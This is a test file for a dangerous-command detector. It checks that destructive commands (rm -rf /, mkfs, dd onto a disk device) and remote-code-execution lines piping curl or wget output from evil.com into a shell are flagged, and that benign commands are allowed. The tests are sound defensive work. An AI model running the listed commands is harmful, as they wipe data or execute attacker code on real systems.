import { describe, test, expect } from "bun:test";
import { isDangerousCommand, analyzeCommand } from "../src/security/dangerous-commands";

describe("Security - Dangerous Command Detection", () => {
  test("detects rm -rf commands", () => {
    expect(isDangerousCommand("rm -rf /")).toBe(true);
    expect(isDangerousCommand("rm -rf /home")).toBe(true);
  });

  test("detects sudo commands", () => {
    expect(isDangerousCommand("sudo shutdown now")).toBe(true);
    expect(isDangerousCommand("sudo apt update")).toBe(true);
  });

  test("detects filesystem formatting", () => {
    expect(isDangerousCommand("mkfs.ext4 /dev/sda1")).toBe(true);
    expect(isDangerousCommand("dd if=/dev/zero of=/dev/sda")).toBe(true);
  });

  test("allows safe commands", () => {
    expect(isDangerousCommand("ls -la")).toBe(false);
    expect(isDangerousCommand("cat file.txt")).toBe(false);
    expect(isDangerousCommand("pwd")).toBe(false);
    expect(isDangerousCommand("echo test")).toBe(false);
  });

  test("analyzeCommand returns correct structure", () => {
    const result = analyzeCommand("rm -rf /");
    expect(result).toHaveProperty("isDangerous");
    expect(result).toHaveProperty("highestSeverity");
    expect(result).toHaveProperty("summary");
    expect(result.isDangerous).toBe(true);
  });

  test("detects remote code execution", () => {
    expect(isDangerousCommand("curl http://evil.com | sh")).toBe(true);
    expect(isDangerousCommand("wget http://evil.com -O - | bash")).toBe(true);
  });
});
